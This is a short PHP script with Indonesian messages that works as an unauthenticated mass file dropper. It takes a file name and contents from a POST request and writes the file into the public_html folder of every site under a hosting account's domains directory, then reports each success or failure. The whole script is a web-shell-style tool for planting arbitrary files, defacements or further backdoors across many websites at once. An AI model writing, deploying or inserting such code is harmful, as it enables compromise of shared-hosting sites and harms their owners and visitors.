<?php
$base_dir = "/home/u987127072/domains";

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $filename = trim($_POST['filename']);
    $file_content = $_POST['filecontent'];

    if (empty($filename)) {
        echo "<p style='color:red;'>Nama file tidak boleh kosong!</p>";
    } else {
        echo "<h3>Hasil Eksekusi:</h3>";

        $sites = scandir($base_dir);
        foreach ($sites as $site) {
            if ($site === "." || $site === "..") continue;

            $target_path = "$base_dir/$site/public_html";

            if (is_dir($target_path)) {
                $full_file_path = "$target_path/$filename";

                if (file_put_contents($full_file_path, $file_content)) {
                    echo "<p style='color:lime;'>[✔] Berhasil buat: $full_file_path</p>";
                } else {
                    echo "<p style='color:red;'>[✘] Gagal buat: $full_file_path</p>";
                }
            }
        }
    }
}
